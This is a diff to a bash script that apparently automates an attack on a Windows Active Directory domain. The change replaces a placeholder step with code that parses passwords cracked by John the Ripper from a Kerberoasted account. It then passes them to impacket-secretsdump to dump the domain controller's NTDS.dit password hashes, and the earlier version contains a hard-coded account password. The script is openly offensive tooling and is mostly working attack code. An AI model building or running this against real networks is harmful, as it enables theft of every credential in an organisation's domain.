@@ -131,15 +131,30 @@ crack_hash() {
         exit 1
     fi
 
-    sleep 25
-    echo "[*] Status: user 'webapp01' Cracked!"
+    # Extract cracked credentials
+    echo "[*] Extracting cracked credentials..."
+    CRACKED_OUTPUT=$(john --show webapp01.hash)
+    if [[ -z "$CRACKED_OUTPUT" || ! "$CRACKED_OUTPUT" =~ ^[^:]+:[^:]+ ]]; then
+        echo "Error: Failed to retrieve cracked credentials."
+        exit 1
+    fi
+
+    # Parse username and password (assuming format username:password)
+    KERBEROAST_USER=$(echo "$CRACKED_OUTPUT" | head -n 1 | cut -d ':' -f 1)
+    KERBEROAST_PASS=$(echo "$CRACKED_OUTPUT" | head -n 1 | cut -d ':' -f 2)
+    if [[ -z "$KERBEROAST_USER" || -z "$KERBEROAST_PASS" ]]; then
+        echo "Error: Could not parse username or password from John output."
+        exit 1
+    fi
+
+    echo "[*] Status: user '$KERBEROAST_USER' Cracked!"
     echo "##########Pwn3d##############"
 }
 
 # Function to dump NTDS.dit
 dump_ntds() {
     echo "[*] Dumping NTDS.dit via DCSYNC..."
-    impacket-secretsdump -dc-ip "$TARGET_IP" -use-vss -target-ip "$TARGET_IP" "$DOMAIN/webapp01:webapp0101!@$TARGET_IP"
+    impacket-secretsdump -dc-ip "$TARGET_IP" -use-vss -target-ip "$TARGET_IP" "$DOMAIN/$KERBEROAST_USER:$KERBEROAST_PASS@$TARGET_IP"
     if [[ $? -ne 0 ]]; then
         echo "Error: NTDS.dit dump failed."
         exit 1
